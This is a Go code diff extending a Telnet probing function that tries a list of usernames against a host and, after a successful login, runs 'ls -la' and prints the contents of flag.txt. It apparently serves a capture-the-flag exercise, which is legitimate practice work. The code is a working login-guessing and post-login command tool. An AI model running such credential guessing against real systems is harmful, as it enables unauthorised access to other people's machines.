@@ -18,7 +18,8 @@ func ProbeTelnet(ipAddress string) {
 		return
 	}
 	fmt.Println("Connected to Telnet", address)
-	scrollScanBuffer(conn)
+	//Scroll scan buffer for login prompt
+	scrollScanBuffer(conn, "login:")
 	for _, username := range usernames {
 		fmt.Printf("Trying to log in with username: %s\n", username)
 		// Send the username
@@ -43,6 +44,22 @@ func ProbeTelnet(ipAddress string) {
 		// Check if the response indicates a successful login
 		if strings.Contains(response, "Welcome") || strings.Contains(response, "Success") {
 			fmt.Println("Login succeeded with username:", username)
+			scrollScanBuffer(conn, "#")
+			fmt.Println("Buffer Scrolled")
+			conn.Write([]byte("ls -la\n"))
+			time.Sleep(5 * time.Second)
+			scrollScanBuffer(conn, "#")
+			filepath := readBuffer(conn)
+			fmt.Println("Filepath:", filepath)
+			if strings.Contains(filepath, "flag.txt") {
+				fmt.Println("Flag file found")
+				conn.Write([]byte("cat flag.txt\n"))
+				time.Sleep(5 * time.Second)
+				fmt.Println("Flag: " + readBuffer(conn))
+				break
+			} else {
+				fmt.Println("Flag file not found")
+			}
 		} else {
 			fmt.Println("Login failed with username:", username)
 		}
@@ -51,18 +68,26 @@ func ProbeTelnet(ipAddress string) {
 	fmt.Println("Connection closed")
 }
 
-func scrollScanBuffer(connection telnet.Conn) {
-	buf := make([]byte, 50000)
+func scrollScanBuffer(connection *telnet.Conn, keyword string) {
 	for {
-		n, err := connection.Read(buf)
-		if err != nil {
-			fmt.Println("Failed to read response:", err)
-			return
-		}
-		response := string(buf[:n])
-		if strings.Contains(response, "login") {
+		response := readBuffer(connection)
+		if strings.Contains(response, keyword) {
 			return
 		}
 	}
 
+}
+
+func readBuffer(connection *telnet.Conn) string {
+	buf := make([]byte, 50000)
+	n, err := connection.Read(buf)
+	if err != nil {
+		fmt.Println("Failed to read response:", err)
+		return ""
+	}
+	response := string(buf[:n])
+	fmt.Println(
+		"Response:", response,
+	)
+	return response
 }
